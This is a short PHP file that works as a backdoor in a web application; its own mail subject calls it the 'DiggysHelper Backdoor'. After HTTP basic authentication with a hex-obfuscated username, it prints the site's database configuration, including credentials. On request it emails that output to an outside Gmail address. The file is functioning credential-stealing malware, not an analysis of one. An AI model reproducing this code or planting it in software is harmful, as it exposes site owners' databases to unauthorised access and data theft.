<?php
/*//@b*/
ini_set("display_errors", 1);
error_reporting( E_ALL | E_STRICT );
require("./includes/load.php");
header("Content-Type: text/plain;charset=us-ascii");

if(!isset($_SERVER["PHP_AUTH_USER"]) || !isset($_SERVER["PHP_AUTH_PW"])) {
	header("WWW-Authenticate: basic realm=\"\x5a\x61\x64\x6e\xe9\x20\x76\x72\xe1\x74\x6b\x61\"", true, 401);
	echo "You can't enter signed out. Try signing in to display the contents.";
} else {
	switch($_SERVER["PHP_AUTH_USER"]) {
		case "\x4b\x75\x62\x6f\x32":
			header("Content-Type: text/plain;charset=utf-8", true, 200);
			@ob_start();
			echo "These are database informations.\n\n";
			foreach(Config::getInstance()->getDb() as $key => $value) {
			echo "$key: $value\n";
			}
			if(isset($_GET['mail'])) {
				mail(
					"kelerest123@gmail.com",
					'Db Info - DiggysHelper Backdoor',
					@ob_get_contents()
				);
			}
			@ob_end_flush();
		break;

		default:
			header("Content-Type: text/plain;charset=us-ascii", true, 403);
			echo "You have forbidden accessing this. Try changing user.";
		exit;
	}
}
/*//!@b*/